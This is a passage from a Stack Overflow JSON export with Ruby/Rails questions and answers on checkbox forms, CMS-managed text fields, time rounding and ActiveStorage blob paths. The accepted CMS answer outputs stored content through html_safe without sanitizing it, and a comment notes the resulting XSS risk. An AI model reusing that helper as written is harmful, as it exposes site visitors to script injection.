52048624, "link": "https://stackoverflow.com/questions/52048624/how-do-i-submit-more-than-one-checkbox-in-an-html-form/52048716#52048716", "title": "How do I submit more than one checkbox in an HTML form?", "body": "<p>I have always known that in html's forms the ids and names must be unique, unless you are working with radio buttons or in this case checkboxes.  Your code seems to be a bit overmade, meaning, you have 2 names and 2 values on each checkbox, and just the last one of both of them will work, so instead of this:</p>\n\n<pre><code>&lt;input type=\"checkbox\" name=\"state_name\" value=\"Connecticut\" name=\"abbreviation\" value=\"CT\"&gt; Connecticut&lt;br&gt;\n</code></pre>\n\n<p>Try just having one of those attributes:</p>\n\n<pre><code>&lt;input type=\"checkbox\" name=\"abbreviation\" value=\"CT\"&gt; Connecticut&lt;br /&gt;\n</code></pre>\n\n<p>Usually, <s>in</s> for php we would append a '[]' at the end of the name, and you will recieve an array of the values that were checked. But since you are using ruby, which I am a bit familiar to, I've seen the ruby developers like to be a bit more expressive in their code, and sometimes they do things like this:</p>\n\n<pre><code>&lt;input type=\"checkbox\" name=\"abbreviation[city_1]\" value=\"CT\"&gt;Connecticut&lt;br /&gt;\n&lt;input type=\"checkbox\" name=\"abbreviation[city_2]\" value=\"DE\"&gt;Delaware&lt;br /&gt;\n</code></pre>\n\n<p>And so on.</p>\n\n<p>You can see an example of it, <a href=\"https://learn.co/lessons/sinatra-complex-forms-associations\" rel=\"nofollow noreferrer\">here</a>, even though I believe you can do it with the empty '[]', but just so you know I've been told that's the php-ish way to do it.</p>\n\n<p>Cheers!</p>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535433528, "post_id": 52050205, "comment_id": 91051331, "body": "Right but the point is that it posts the states in a numbered list to show which ones the user has been to. So I don&#39;t want an array. I just want it to post the individual state names for each one checked."}, {"owner": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535433822, "post_id": 52050205, "comment_id": 91051437, "body": "Not quite sure what you mean by that. Sorry, I&#39;m a beginner!"}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "reply_to_user": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535433827, "post_id": 52050205, "comment_id": 91051440, "body": "Why do you wan&#39;t both the state name and abbreviation on the backend? Can&#39;t you figure out one from the another?"}, {"owner": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535434336, "post_id": 52050205, "comment_id": 91051627, "body": "The state name is what is important, and that is the main attribute I am going for. However, I also want the state to be associated with an abbreviation so I can iterate over photos (which are named by the state&#39;s abbreviation) to display the correct state photo when viewing an individual state. Am I going about this wrong?"}, {"owner": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535434641, "post_id": 52050205, "comment_id": 91051747, "body": "Here is my repository: <a href=\"https://github.com/cbronzo/travel_app\" rel=\"nofollow noreferrer\">github.com/cbronzo/travel_app</a> ... I haven&#39;t commited my major updates because I&#39;ve been playing around so much with this, but maybe this will give you a better idea of whats going on."}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "reply_to_user": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535435259, "post_id": 52050205, "comment_id": 91051969, "body": "As per your <a href=\"https://github.com/cbronzo/travel_app/blob/master/db/schema.rb\" rel=\"nofollow noreferrer\">schema</a> you have state name and abbreviation both stored in database. So, you can easily find the full names if you have the abbreviations in your controller. No need to pass both of them from the form."}, {"owner": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535435765, "post_id": 52050205, "comment_id": 91052148, "body": "I guess that is where I am confused, how does the database have my state_names? Where have I written out each state name other than in the form?"}, {"owner": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535435841, "post_id": 52050205, "comment_id": 91052180, "body": "Ok I just added my state controller to the post."}], "tags": [], "owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "is_accepted": false, "score": 1, "last_activity_date": 1535433657, "last_edit_date": 1535433657, "creation_date": 1535431219, "answer_id": 52050205, "question_id": 52048624, "link": "https://stackoverflow.com/questions/52048624/how-do-i-submit-more-than-one-checkbox-in-an-html-form/52050205#52050205", "title": "How do I submit more than one checkbox in an HTML form?", "body": "<p>You need to append <code>[]</code> to your name attribute to support array value i.e. more than one checked values:</p>\n\n<pre><code>&lt;input type=\"checkbox\" name=\"state_name[]\" value=\"Connecticut\"&gt; Connecticut&lt;br&gt;\n&lt;input type=\"checkbox\" name=\"state_name[]\" value=\"Deleware\"&gt; Deleware&lt;br&gt;\n&lt;input type=\"checkbox\" name=\"state_name[]\" value=\"Maine\"&gt; Maine&lt;br&gt;\n&lt;input type=\"checkbox\" name=\"state_name[]\" value=\"Maryland\"&gt; Maryland&lt;br&gt;\n</code></pre>\n\n<p>Now on your server, you will see the checked values as <code>state_name: ['Connecticut', 'Maine', ...]</code>.</p>\n\n<p>Note: You have specified the <code>name</code> and <code>value</code> attributes twice for each checkbox. I am using the first one.</p>\n"}], "owner": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 740, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1535435807, "creation_date": 1535417062, "last_edit_date": 1535435807, "question_id": 52048624, "link": "https://stackoverflow.com/questions/52048624/how-do-i-submit-more-than-one-checkbox-in-an-html-form", "title": "How do I submit more than one checkbox in an HTML form?", "body": "<p>This is a project for school, and so far I only know Ruby, Sinatra, HTML &amp; CSS. I've looked online but only came across PHP and Javascript insturctions (which I'm not supposed to use yet).</p>\n\n<p>I have a form for checkboxes, and although I can check off more than one, only one of the checkbox values gets posted. How do I get it so all of the checked off ones are passed?</p>\n\n<p>Also, 'abbreviation' comes out nil for each state. Am I doing this wrong in my form? And if anything it just uses ONE of the abbreviations and adds it to every state. Finally, how do I make it so the checkboxes remain checked for the states users have already added in the past? </p>\n\n<p>Here's some code:</p>\n\n<pre><code>&lt;form method=\"POST\" action=\"/states\"&gt;\n&lt;h3&gt;Northeast:&lt;/h3&gt; &lt;br&gt;\n&lt;input type=\"checkbox\" name=\"state_name\" value=\"Connecticut\" name=\"abbreviation\" value=\"CT\"&gt; Connecticut&lt;br&gt;\n&lt;input type=\"checkbox\" name=\"state_name\" value=\"Deleware\" name=\"abbreviation\" value=\"DE\"&gt; Deleware &lt;br&gt;\n&lt;input type=\"checkbox\" name=\"state_name\" value=\"Maine\" name=\"abbreviation\" value=\"ME\"&gt; Maine&lt;br&gt;\n&lt;input type=\"checkbox\" name=\"state_name\" value=\"Maryland\" name=\"abbreviation\" value=\"MD\"&gt; Maryland&lt;br&gt;\n</code></pre>\n\n<p>\n</p>\n\n<pre><code>require 'pry'\nclass StatesController &lt; ApplicationController\n\n  get '/states' do\n    if logged_in?\n        @user = current_user\n        @states = current_user.states\n      erb :'states/states'\n    else\n      redirect to '/login'\n    end\n  end\n\n\n  get '/states/new' do\n    if logged_in?\n      erb :'/states/create'\n    else\n      redirect to '/login'\n    end\n  end\n\n  post '/states' do\n      if logged_in? &amp;&amp; params[:state_name] != \"\"\n        @state = State.create(:state_name =&gt; params[:state_name], :abbreviation =&gt; params[:abbreviation])\n        # binding.pry\n        @state.users &lt;&lt; current_user\n          if @state.errors.any?\n              \"Error, try again\"\n          else\n            redirect \"/states\"\n          end\n      else\n        redirect to \"/states/new\"\n      end\n    end\n\n\n  get '/states/:id' do\n    if logged_in?\n      @state = State.find_by_id(params[:id])\n\n        if @state != nil\n          erb :'/states/show'\n        else\n          redirect to '/states'\n        end\n    else\n      redirect to '/login'\n    end\n  end\n\n\n  get '/states/:id/edit' do\n    if logged_in?\n      @state = State.find_by_id(params[:id])\n      if @state &amp;&amp; current_user\n        erb :'states/edit'\n      else\n        redirect to '/states'\n      end\n    else\n      redirect to '/login'\n    end\n  end\n\n\n    patch '/states/:id' do\n      @state = State.find_by_id(params[:id])\n        if params[:state_name] != \"\" &amp;&amp; @state.update(:state_name =&gt; params[:state][:state_name])\n          @state.update(:state_name =&gt; params[:state][:state_name])\n          redirect to \"/states/#{@state.id}\"\n        else\n          redirect to \"/states/#{@state.id}/edit\"\n        end\n    end\n\n    delete '/states/:id/delete' do\n      if logged_in?\n        @state = State.find_by_id(params[:id])\n          if @state &amp;&amp; current_user\n              @state.destroy\n          end\n        redirect to '/states'\n      else\n        redirect to '/login'\n      end\n  end\nend\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-5"], "answers": [{"comments": [{"owner": {"reputation": 346, "user_id": 1467034, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70a577651a2e5691558961cb68f82be7?s=128&d=identicon&r=PG", "display_name": "tshm001", "link": "https://stackoverflow.com/users/1467034/tshm001"}, "edited": false, "score": 0, "creation_date": 1535439137, "post_id": 52049522, "comment_id": 91053649, "body": "Thanks for sharing this. We already have a dashboard fleshed out, I just needed content management of text areas throughout the site rather than management of all of the objects themselves / dashboards. I posted my own solution below."}], "tags": [], "owner": {"reputation": 5428, "user_id": 1938097, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/928c1abb5e28975cff71561ce3ed98d6?s=128&d=identicon&r=PG", "display_name": "Austio", "link": "https://stackoverflow.com/users/1938097/austio"}, "is_accepted": false, "score": 1, "last_activity_date": 1535425752, "creation_date": 1535425752, "answer_id": 52049522, "question_id": 52047645, "link": "https://stackoverflow.com/questions/52047645/best-practices-to-provide-rails-content-managed-fields/52049522#52049522", "title": "Best practices to provide Rails content managed fields?", "body": "<p>Take a look at administrate <a href=\"https://github.com/thoughtbot/administrate\" rel=\"nofollow noreferrer\">https://github.com/thoughtbot/administrate</a></p>\n\n<p>I've used this several times and it is pretty great and flexible.  Also ActiveAdmin was pretty ok <a href=\"https://github.com/activeadmin/activeadmin\" rel=\"nofollow noreferrer\">https://github.com/activeadmin/activeadmin</a></p>\n"}, {"comments": [{"owner": {"reputation": 5428, "user_id": 1938097, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/928c1abb5e28975cff71561ce3ed98d6?s=128&d=identicon&r=PG", "display_name": "Austio", "link": "https://stackoverflow.com/users/1938097/austio"}, "edited": false, "score": 0, "creation_date": 1535543179, "post_id": 52051745, "comment_id": 91102969, "body": "Consider sanitizing the <code>content</code> here before passing it on the the end user.  Would be easy with this for an admin to add a xss.  This is what i normally use <a href=\"https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html\" rel=\"nofollow noreferrer\">api.rubyonrails.org/classes/ActionView/Helpers/&hellip;</a>  Similar approach <code>sanitize(content).html_safe</code>"}], "tags": [], "owner": {"reputation": 346, "user_id": 1467034, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70a577651a2e5691558961cb68f82be7?s=128&d=identicon&r=PG", "display_name": "tshm001", "link": "https://stackoverflow.com/users/1467034/tshm001"}, "is_accepted": true, "score": 0, "last_activity_date": 1535439061, "creation_date": 1535439061, "answer_id": 52051745, "question_id": 52047645, "link": "https://stackoverflow.com/questions/52047645/best-practices-to-provide-rails-content-managed-fields/52051745#52051745", "title": "Best practices to provide Rails content managed fields?", "body": "<p>I accomplished this by first creating a model for all future cms managed fields and a migration with default values. The fields have a static <code>:name</code> variable which is determined by the developer (me). Then I call them by name in my views with the application_helper. And that's it, dead simple CMS functionality. Now any time I add a field I can slap it on any page and have it all managed on one page of my existing admin panel called \"CMS.\"</p>\n\n<p>create_site_field_migration.rb:</p>\n\n<pre><code>class CreateSiteFields &lt; ActiveRecord::Migration[5.0]\n  def change\n    create_table :site_fields do |t|\n      t.string :name, null: false\n      t.text :content, null: false\n\n      t.timestamps\n    end\n\n    # readonly names and default values of content managed fields\n    SiteField.create(name: \"home_header_text\", content: \"Lorem ipsum sit dolor le amet.\")\n    SiteField.create(name: \"home_body_text\", content: \"Requisitor mon lormen doit namet.\")\n  end\nend\n</code></pre>\n\n<p>I have the admins able to edit the fields in my admin panel that's already auth guarded separately. </p>\n\n<p>To expose the fields for the front end, I'm using <code>application_helper</code> to expose a variable: </p>\n\n<p>application_helper.rb:</p>\n\n<pre><code>  def site_field(name)\n    SiteField.find_by(name: name).content.html_safe\n  end\n</code></pre>\n\n<p>And then I'm referencing the statically named fields wherever I need in my views:</p>\n\n<p>home.html.erb:</p>\n\n<pre><code>&lt;%= site_field(:home_body_text) %&gt;\n</code></pre>\n"}], "owner": {"reputation": 346, "user_id": 1467034, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70a577651a2e5691558961cb68f82be7?s=128&d=identicon&r=PG", "display_name": "tshm001", "link": "https://stackoverflow.com/users/1467034/tshm001"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68, "favorite_count": 0, "accepted_answer_id": 52051745, "answer_count": 2, "score": 0, "last_activity_date": 1535439061, "creation_date": 1535408244, "question_id": 52047645, "link": "https://stackoverflow.com/questions/52047645/best-practices-to-provide-rails-content-managed-fields", "title": "Best practices to provide Rails content managed fields?", "body": "<p>To clarify first and foremost, we are not looking for a CMS. We have an application which is already complete and live.</p>\n\n<p>I want to create an area on the backend for logged in admins to manage fields which appear on the front end of the website.</p>\n\n<p>I thought about creating a table: CMS_Fields. Each CMS_Field can have <code>:name</code>, <code>:content</code>, and <code>:timestamp</code> fields. Then I would display that particular field where I want it by calling it in the view by its <code>:name</code>. To make that particular field editable on the backend, I would create a disabled input with the <code>:name</code> of the field inside the disabled input and have the user themselves input the :content before they save. This also means that I must initialize all of the fields with the correct default values for <code>:name</code>. Does that make sense to do?</p>\n\n<p>In order to use those fields within different views which don't belong to the CMSFieldController I would use a helper variable. Does this break convention hard and how ok is that?</p>\n\n<p>Does this seem like the correct approach or should I consider a different way of doing things, or maybe even a gem?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "time", "rounding"], "comments": [{"owner": {"reputation": 48635, "user_id": 6742, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/xPawo.png?s=128&g=1", "display_name": "David Aldridge", "link": "https://stackoverflow.com/users/6742/david-aldridge"}, "edited": false, "score": 0, "creation_date": 1535407249, "post_id": 52047471, "comment_id": 91045940, "body": "You could write that method, using the code that works, and add it to Time as a refinement?"}, {"owner": {"reputation": 2007, "user_id": 716039, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/76b302eed6a8add5db6b3f2e1c7c9942?s=128&d=identicon&r=PG", "display_name": "dinjas", "link": "https://stackoverflow.com/users/716039/dinjas"}, "edited": false, "score": 3, "creation_date": 1535409351, "post_id": 52047471, "comment_id": 91046443, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/449271/how-to-round-a-time-down-to-the-nearest-15-minutes-in-ruby\">How to round a time down to the nearest 15 minutes in Ruby?</a>"}, {"owner": {"reputation": 3856, "user_id": 667772, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/868d6be1007c9ff2238abe0a6b4f7415?s=128&d=identicon&r=PG", "display_name": "Dan L", "link": "https://stackoverflow.com/users/667772/dan-l"}, "reply_to_user": {"reputation": 2007, "user_id": 716039, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/76b302eed6a8add5db6b3f2e1c7c9942?s=128&d=identicon&r=PG", "display_name": "dinjas", "link": "https://stackoverflow.com/users/716039/dinjas"}, "edited": false, "score": 0, "creation_date": 1535410478, "post_id": 52047471, "comment_id": 91046678, "body": "@dinjas: I think you are correct that this is a duplicate of that question.  Should I close/delete this question or is there a process for linking/merging similar questions?"}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535413228, "post_id": 52047471, "comment_id": 91047205, "body": "Flag it as duplicate and it will get linked to the other question in the header. There is no need to delete the question."}], "answers": [{"tags": [], "owner": {"reputation": 33, "user_id": 8785878, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FtLdAzGPP28/AAAAAAAAAAI/AAAAAAAAAEA/m3x_6f8jGvc/photo.jpg?sz=128", "display_name": "matty_keene", "link": "https://stackoverflow.com/users/8785878/matty-keene"}, "is_accepted": false, "score": 2, "last_activity_date": 1535409198, "creation_date": 1535409198, "answer_id": 52047776, "question_id": 52047471, "link": "https://stackoverflow.com/questions/52047471/ruby-rails-get-time-in-closest-15-min-increment/52047776#52047776", "title": "Ruby/Rails: get time in closest 15-min increment", "body": "<p>It may seem clunky because you have to do some math on a couple of lines there, but that looks like a great solution to me. Sometimes you have to forego elegance for functionality. </p>\n"}], "owner": {"reputation": 3856, "user_id": 667772, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/868d6be1007c9ff2238abe0a6b4f7415?s=128&d=identicon&r=PG", "display_name": "Dan L", "link": "https://stackoverflow.com/users/667772/dan-l"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 292, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1535409198, "creation_date": 1535406880, "question_id": 52047471, "link": "https://stackoverflow.com/questions/52047471/ruby-rails-get-time-in-closest-15-min-increment", "title": "Ruby/Rails: get time in closest 15-min increment", "body": "<p>I'm trying to round the current time to the closest 15-min increment.</p>\n\n<p>For example, if the current time is \"4:37pm\", I want it to round to \"4:30pm\".  And if it were \"4:41pm\", it should round to \"4:45pm\".</p>\n\n<p>The reason for this is I have an HTML select that has 15-min increments, and I want to default it to select the closest option based on time.</p>\n\n<p>I've come across some code that works, but it seems clunky:</p>\n\n<pre><code>increment = 15*60                                          # =&gt; 900 (15 min in seconds)\ncurrent_time = Time.zone.now                               # =&gt; Mon, 27 Aug 2018 17:50:31 EDT -04:00\nTime.at((current_time.to_r / increment).round * increment) # =&gt; 2018-08-27 17:45:00 -0400\n</code></pre>\n\n<p>I'm surprised there's not a built-in time function like  <code>Time.now.round_to_closest(increment_in_min: 15)</code></p>\n\n<p>Is it there and I'm just missing it?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "rails-activestorage"], "comments": [{"owner": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535420982, "post_id": 52046957, "comment_id": 91048741, "body": "What is the value of <code>c</code> and <code>c.allegati</code>? Also, can you provide more code to what you have done, like model, view, configuration file."}, {"owner": {"reputation": 5428, "user_id": 1938097, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/928c1abb5e28975cff71561ce3ed98d6?s=128&d=identicon&r=PG", "display_name": "Austio", "link": "https://stackoverflow.com/users/1938097/austio"}, "edited": false, "score": 0, "creation_date": 1535425854, "post_id": 52046957, "comment_id": 91049624, "body": "Hey, so that random Hex is id of the object in Ruby, it will change with each new instance that is created."}, {"owner": {"reputation": 5428, "user_id": 1938097, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/928c1abb5e28975cff71561ce3ed98d6?s=128&d=identicon&r=PG", "display_name": "Austio", "link": "https://stackoverflow.com/users/1938097/austio"}, "edited": false, "score": 0, "creation_date": 1535426165, "post_id": 52046957, "comment_id": 91049693, "body": "I think that you are calling the path on a collection instead of an item.  Try sending <code>first</code> to the c variable and let me know what you see.  If that works, you will need to iterate over the collection and call path on each one.      <code>Rails.application.routes.url_helpers.rails_blob_path(c.first&zwnj;&#8203;.allegati, only_path: true)</code>"}, {"owner": {"reputation": 51, "user_id": 7451310, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0xNvM.jpg?s=128&g=1", "display_name": "Ferdi2005", "link": "https://stackoverflow.com/users/7451310/ferdi2005"}, "reply_to_user": {"reputation": 5428, "user_id": 1938097, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/928c1abb5e28975cff71561ce3ed98d6?s=128&d=identicon&r=PG", "display_name": "Austio", "link": "https://stackoverflow.com/users/1938097/austio"}, "edited": false, "score": 0, "creation_date": 1535445280, "post_id": 52046957, "comment_id": 91057128, "body": "@Austio with your code it gives me this error: undefined method <code>undefined method </code>first&#39; for #&lt;Sostituzione:0x00007f85c78a8a28&gt;`"}, {"owner": {"reputation": 51, "user_id": 7451310, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0xNvM.jpg?s=128&g=1", "display_name": "Ferdi2005", "link": "https://stackoverflow.com/users/7451310/ferdi2005"}, "reply_to_user": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535445315, "post_id": 52046957, "comment_id": 91057142, "body": "@KedarnagMukanahallipatna Now I&#39;m providing more code :D"}, {"owner": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535445503, "post_id": 52046957, "comment_id": 91057243, "body": "What I would suggest is, put a debugger, just before the line which is throwing the error, and print the values of <code>c</code> and <code>c.allegati</code> and update your OP with them."}, {"owner": {"reputation": 51, "user_id": 7451310, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0xNvM.jpg?s=128&g=1", "display_name": "Ferdi2005", "link": "https://stackoverflow.com/users/7451310/ferdi2005"}, "edited": false, "score": 0, "creation_date": 1535446734, "post_id": 52046957, "comment_id": 91057957, "body": "I added more code, in 5 minutes I will add the result of debug"}], "answers": [{"tags": [], "owner": {"reputation": 51, "user_id": 7451310, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0xNvM.jpg?s=128&g=1", "display_name": "Ferdi2005", "link": "https://stackoverflow.com/users/7451310/ferdi2005"}, "is_accepted": true, "score": 3, "last_activity_date": 1535556323, "creation_date": 1535556323, "answer_id": 52081117, "question_id": 52046957, "link": "https://stackoverflow.com/questions/52046957/rails-undefined-method-signed-id-for-activestorageattachedmanycasualid/52081117#52081117", "title": "Rails: undefined method `signed_id&#39; for #&lt;ActiveStorage::Attached::Many:casualID&gt;", "body": "<p>Solved! For multiple attachments (allegati in italian) there is @sostituzione.allegati.first etc.\nI solved with this code:</p>\n\n<pre><code>&lt;% @sostituzione.allegati.each do |allegato| %&gt;\n&lt;div class=\"level\"&gt;\n  &lt;%= link_to 'Scarica documento allegato', rails_blob_path(allegato, only_path: true), class: 'button is-primary is-big' %&gt;\n&lt;/div&gt;\n&lt;% end %&gt;\n</code></pre>\n"}], "owner": {"reputation": 51, "user_id": 7451310, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0xNvM.jpg?s=128&g=1", "display_name": "Ferdi2005", "link": "https://stackoverflow.com/users/7451310/ferdi2005"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3616, "favorite_count": 0, "accepted_answer_id": 52081117, "answer_count": 1, "score": 1, "last_activity_date": 1535556348, "creation_date": 1535403915, "last_edit_date": 1535556348, "question_id": 52046957, "link": "https://stackoverflow.com/questions/52046957/rails-undefined-method-signed-id-for-activestorageattachedmanycasualid", "title": "Rails: undefined method `signed_id&#39; for #&lt;ActiveStorage::Attached::Many:casualID&gt;", "body": "<p>I'm on Ruby 2.4.1-rc2 and Rails 5.2.1 and I'm using active storage. File uploading is perfect, but when I try to recall a file download url with <code>rails_blob_path(user.avatar, disposition: \"attachment\", only_path: true)</code> or <code>Rails.application.routes.url_helpers.rails_blob_path(c.allegati, only_path: true)</code>, it gives me this error: </p>\n\n<pre><code>NoMethodError at /profilepage\nundefined method `signed_id' for #&lt;ActiveStorage::Attached::Many:0x00007f85c90dd170&gt;\n</code></pre>\n\n<p>0x00007f85c90dd170 changes everytime I reload.</p>\n\n<p>I searched here and on Google but no one has this issue, my ActiveStorage config is the standard config (except for S3 credentials).</p>\n\n<p>Any ideas? Thanks in advance.</p>\n\n<p><strong>Edit: more code</strong></p>\n\n<p><em>show.html.erb</em></p>\n\n<pre><code>  &lt;% if @utente.sostitutore == \"1\" %&gt;\n  &lt;h1 class=\"title is-3\"&gt;Sostituzioni accettate&lt;/h1&gt;\n  &lt;% b = Sostituzione.where(sostitutore: utente_corrente.id) %&gt;\n  &lt;% if b.empty? %&gt;\n  &lt;p&gt;\n  Nessuna sostituzione accettata\n  &lt;/p&gt;\n  &lt;br /&gt;\n  &lt;% else %&gt;\n        &lt;% b.each do |c| %&gt;\n            &lt;%= Rails.application.routes.url_helpers.rails_blob_path(c.allegati, only_path: true) %&gt;\n\n  &lt;% end %&gt;\n  &lt;% end %&gt;\n  &lt;% end %&gt;\n</code></pre>\n\n<p><em>model</em></p>\n\n<pre><code>class Sostituzione &lt; ApplicationRecord\n   attr_accessor :termini\n   has_many_attached :allegati\n   has_many_attached :documentiudienza\nend\n</code></pre>\n\n<p><strong>Edit2</strong>: it resultes via debug empty despite it's being uploaded correctly.</p>\n\n<p><strong>Solved</strong></p>\n"}, {"tags": ["ruby-on-rails", "ruby", "reactjs"], "comments": [{"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1535402348, "post_id": 52045694, "comment_id": 91044270, "body": "That tutorial was written 3 years ago using <code>react-rails</code> v1 current version is 2.4.7 maybe try to find a newer tutorial?"}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1535402739, "post_id": 52045694, "comment_id": 91044410, "body": "Here are a few <a href=\"https://medium.com/quick-code/simple-rails-crud-app-with-react-frontend-using-react-rails-gem-b708b89a9419\" rel=\"nofollow noreferrer\">medium.com/quick-code/&hellip;</a> , <a href=\"https://www.pluralsight.com/guides/building-a-crud-interface-with-react-and-ruby-on-rails\" rel=\"nofollow noreferrer\">pluralsight.com/guides/&hellip;</a> or <a href=\"https://learnetto.com/users/hrishio/courses/the-complete-react-on-rails-5-course\" rel=\"nofollow noreferrer\">Free Complete Course</a>"}, {"owner": {"reputation": 521, 